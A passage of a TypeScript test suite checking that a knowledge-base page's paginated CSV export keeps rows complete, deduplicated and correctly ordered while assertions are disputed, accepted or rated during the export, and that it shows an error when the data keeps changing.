    const exported = new Set(propositionsOf(text));
    for (const row of rows) {
      if (row.id !== disputed && row.id !== "c-0100") expect(exported).toContain(row.proposition);
    }
    expect(exported).toContain("Clause 0100 applies.");
  });

  it("keeps a row that a new rating moves ahead under Most ratings, in rating order", async () => {
    // Ten rated rows lead; the rest are unrated, oldest first. During the
    // export a colleague rates the very last row of that order.
    const rows = matter(1_100, 10);
    const last = rows[rows.length - 1].id;
    mockedApi.listAssertions.mockImplementation(
      liveServer(rows, (n) => {
        if (n === 2) setRow(rows, last, { ratings_summary: ratings(last, 5) });
      }),
    );

    const { text } = await exportCsv("Clause 1099 applies.", {
      sort: "-rating_count",
      readyText: "Clause 0000 applies.",
    });

    const lines = text.split("\r\n").slice(1);
    const exported = lines.map((line) => line.split(",")[0]);
    expect(exported).toHaveLength(1_100);
    expect(new Set(exported).size).toBe(1_100);
    expect(exported).toContain("Clause 1099 applies.");
    // The file is in the table's order: most ratings first, ties oldest first.
    const counts = lines.map((line) => Number(line.split(",")[8]));
    expect(counts).toEqual([...counts].sort((a, b) => b - a));
    expect(exported.slice(0, 7)).toEqual([
      "Clause 0000 applies.", // 10 ratings
      "Clause 0001 applies.",
      "Clause 0002 applies.",
      "Clause 0003 applies.",
      "Clause 0004 applies.",
      "Clause 0005 applies.", // 5 ratings, created first
      "Clause 1099 applies.", // 5 ratings, rated during the export
    ]);
    expect(exported.slice(7, 11)).toEqual([
      "Clause 0006 applies.", // 4 ratings
      "Clause 0007 applies.",
      "Clause 0008 applies.",
      "Clause 0009 applies.", // 1 rating
    ]);
    expect(exported.slice(11)).toEqual(
      rows.slice(10, -1).map((row) => row.proposition), // unrated, oldest first
    );
    // Paged in insertion order, which no rating can change, then sorted.
    const exportSorts = mockedApi.listAssertions.mock.calls
      .map(([, params]) => params as AssertionListParams)
      .filter((params) => params.limit === 500)
      .map((params) => params.sort);
    expect(new Set(exportSorts)).toEqual(new Set([undefined]));
  });

  it.each([
    // 39 of the rows the first request wrote leave: the last of the 20 rows
    // it read past them is still in reach, so it carries on from there.
    { leaving: 39, offsets: [0, 460, 920], remaining: 1_100 },
    // 40 leave: the last row it wrote and the 20 after it are all out of
    // reach, so it starts over and writes the 1,060 rows that remain.
    { leaving: 40, offsets: [0, 460, 0, 460, 920], remaining: 1_060 },
  ])(
    "bridges up to 39 written rows leaving at once and starts over from 40 ($leaving leave)",
    async ({ leaving, offsets, remaining }) => {
      const rows = matter(1_100);
      const newestFirst = [...rows].reverse();
      const disputed = new Set(newestFirst.slice(0, leaving).map((row) => row.id));
      mockedApi.listAssertions.mockImplementation(
        liveServer(rows, (n) => {
          if (n === 2) for (const id of disputed) setRow(rows, id, { status: "disputed" });
        }),
      );

      const { text } = await exportCsv(newestFirst[0].proposition);

      // Every row once, newest first. Without a restart the rows that left
      // were written before they left; after one, only the rows that remain.
      expect(propositionsOf(text)).toEqual(
        newestFirst.slice(newestFirst.length - remaining).map((row) => row.proposition),
      );
      expect(exportOffsets()).toEqual(offsets);
    },
  );

  it.each([
    { sort: "created_at", label: "Oldest first", onePipelineRun: false },
    { sort: "-created_at", label: "Newest first, all from one pipeline run", onePipelineRun: true },
    { sort: "assertion_type", label: "Type, all of one type", onePipelineRun: false },
  ])(
    "writes a row that joins next to one that leaves in the table's order ($label)",
    async ({ sort, onePipelineRun }) => {
      // Every accepted clause has a proposed twin created just before it
      // (all at one instant for a pipeline run, where insertion order breaks
      // the tie). Before each request, a reviewer disputes the last row the
      // request before returned and accepts its twin: the twin joins right
      // where a row that has left was, which the export must not mistake for
      // rows it has not reached yet.
      const rows = Array.from({ length: 1_100 }, (_, i) => {
        const clause: AssertionListItem = {
          ...a1,
          id: `c-${pad(i)}`,
          proposition: `Clause ${pad(i)} applies.`,
          created_at: onePipelineRun ? minute(0) : minute(i),
          ratings_summary: null,
        };
        const twin: AssertionListItem = {
          ...clause,
          id: `t-${pad(i)}`,
          proposition: `Clause ${pad(i)} is preceded.`,
          status: "proposed",
          created_at: onePipelineRun ? minute(0) : minute(i - 0.5),
        };
        return [twin, clause];
      }).flat();
      const left = new Set<string>();
      mockedApi.listAssertions.mockImplementation(
        liveServer(rows, (_n, previous) => {
          const last = previous[previous.length - 1];
          if (!last.id.startsWith("c-")) return;
          setRow(rows, last.id, { status: "disputed" });
          setRow(rows, `t-${last.id.slice(2)}`, { status: "accepted" });
          left.add(last.id);
        }),
      );
      const firstInSort = serverOrder(rows, sort).find((row) => row.status === "accepted")!;
      const newest = serverOrder(rows, "-created_at").find((row) => row.status === "accepted")!;

      const { text } = await exportCsv(
        newest.proposition,
        sort === "-created_at" ? undefined : { sort, readyText: firstInSort.proposition },
      );

      const throughout = rows
        .filter((row) => row.id.startsWith("c-") && !left.has(row.id))
        .map((row) => row.id);
      const exported = expectTableOrder(text, rows, sort, throughout);
      expect(left.size).toBeGreaterThan(1);
      expect(exported.some((id) => id.startsWith("t-"))).toBe(true);
    },
  );

  it("keeps the table's order when rows it wrote leave while an older row joins", async () => {
    // Before the third request, 25 rows the second request wrote are
    // disputed while a reviewer accepts an older proposed row.
    const rows = matter(1_600);
    setRow(rows, "c-0499", { status: "proposed" });
    mockedApi.listAssertions.mockImplementation(
      liveServer(rows, (n) => {
        if (n !== 3) return;
        for (let i = 600; i < 625; i += 1) setRow(rows, `c-${pad(i)}`, { status: "disputed" });
        setRow(rows, "c-0499", { status: "accepted" });
      }),
    );

    const { text } = await exportCsv("Clause 1599 applies.", {
      sort: "created_at",
      readyText: "Clause 0000 applies.",
    });

    const changed = (id: string) => id === "c-0499" || (id >= "c-0600" && id < "c-0625");
    const throughout = rows.map((row) => row.id).filter((id) => !changed(id));
    expectTableOrder(text, rows, "created_at", throughout);
  });

  it("keeps the table's order when hundreds of rows join among those it has written", async () => {
    // Accepted and proposed rows alternate; after the first request a bulk
    // accept adds the 650 proposed rows among the oldest 1,300, most of them
    // before the last row the export wrote.
    const rows: AssertionListItem[] = Array.from({ length: 2_400 }, (_, i) => ({
      ...a1,
      id: `c-${pad(i)}`,
      proposition: `Clause ${pad(i)} applies.`,
      status: i % 2 === 0 ? "accepted" : "proposed",
      created_at: minute(i),
      ratings_summary: null,
    }));
    mockedApi.listAssertions.mockImplementation(
      liveServer(rows, (n) => {
        if (n !== 2) return;
        for (const row of rows.slice(0, 1_300)) {
          if (row.status === "proposed") setRow(rows, row.id, { status: "accepted" });
        }
      }),
    );

    const { text } = await exportCsv("Clause 2398 applies.", {
      sort: "created_at",
      readyText: "Clause 0000 applies.",
    });

    const throughout = rows.filter((_, i) => i % 2 === 0).map((row) => row.id);
    expectTableOrder(text, rows, "created_at", throughout);
  });

  it.each([
    // 480 join before the last row it wrote, which is then the next page's
    // last row: still in reach. The rows that joined behind it are left out.
    { joining: 480, offsets: [0, 460, 940, 1_400], startedOver: false },
    // 481: that row and the rows read past it are all beyond the next page,
    // so the export cannot tell where its rows end. It starts over.
    { joining: 481, offsets: [0, 460, 0, 460, 920, 1_380], startedOver: true },
  ])(
    "starts over, in the table's order, when more than 480 rows join before its place ($joining join)",
    async ({ joining, offsets, startedOver }) => {
      // Proposed rows from one pipeline run, created between clauses 0469
      // and 0470, are accepted at once after the first request.
      const rows = matter(1_100);
      const pipeline = Array.from({ length: joining }, (_, i) => ({
        ...a1,
        id: `p-${pad(i)}`,
        proposition: `Pipeline row ${pad(i)} applies.`,
        status: "proposed" as const,
        created_at: new Date(Date.parse(minute(469)) + 30_000).toISOString(),
        ratings_summary: null,
      }));
      rows.splice(470, 0, ...pipeline);
      mockedApi.listAssertions.mockImplementation(
        liveServer(rows, (n) => {
          if (n === 2) for (const row of pipeline) setRow(rows, row.id, { status: "accepted" });
        }),
      );

      const { text } = await exportCsv("Clause 1099 applies.", {
        sort: "created_at",
        readyText: "Clause 0000 applies.",
      });

      // Every row once, in creation order; after starting over, the rows
      // that joined too.
      expect(propositionsOf(text)).toEqual(
        rows
          .filter((row) => startedOver || !row.id.startsWith("p-"))
          .map((row) => row.proposition),
      );
      expect(exportOffsets()).toEqual(offsets);
    },
  );

  it("fails instead of downloading a partial file when rows keep leaving", async () => {
    const rows = matter(1_100);
    let next = rows.length - 1;
    mockedApi.listAssertions.mockImplementation(
      liveServer(rows, () => {
        // 40 more of the newest accepted rows leave before every request,
        // more than it can bridge (see above), so every attempt loses its place.
        for (let i = 0; i < 40; i += 1, next -= 1) setRow(rows, rows[next].id, { status: "disputed" });
      }),
    );
    const createObjectURL = vi.fn((_blob: Blob) => "blob:lexgraph");
    Object.assign(URL, { createObjectURL, revokeObjectURL: vi.fn() });
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText("Clause 1099 applies.");

    await user.click(screen.getByRole("button", { name: "Export CSV" }));

    expect(await screen.findByRole("alert")).toHaveTextContent(
      "CSV export failed: many matching assertions changed while it ran. Export again.",
    );
    expect(createObjectURL).not.toHaveBeenCalled();
  });
});
